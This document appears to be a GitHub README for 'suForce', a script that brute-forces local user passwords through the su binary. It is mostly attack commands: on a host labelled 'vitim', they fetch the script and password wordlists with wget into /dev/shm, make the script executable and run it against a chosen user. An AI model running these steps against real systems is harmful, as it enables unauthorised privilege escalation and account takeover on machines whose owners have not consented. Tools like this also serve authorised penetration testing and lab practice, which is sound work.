# suForce

**`suForce` performs `brute force` attacks on user `passwords` by abusing the `su` binary.**

![](/screenshot.png)

- <kbd>Download</kbd>

  * suForce

```cmd
user@vitim:~$ cd /dev/shm
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce.sh"
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/techyou.txt"
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/top12000.txt"
user@vitim:~$ chmod +x suForce.sh
```

- <kbd>Use</kbd>

```cmd
user@vitim:~$ ./suForce.sh -u <USER> -w <WORDLIST>
```

---
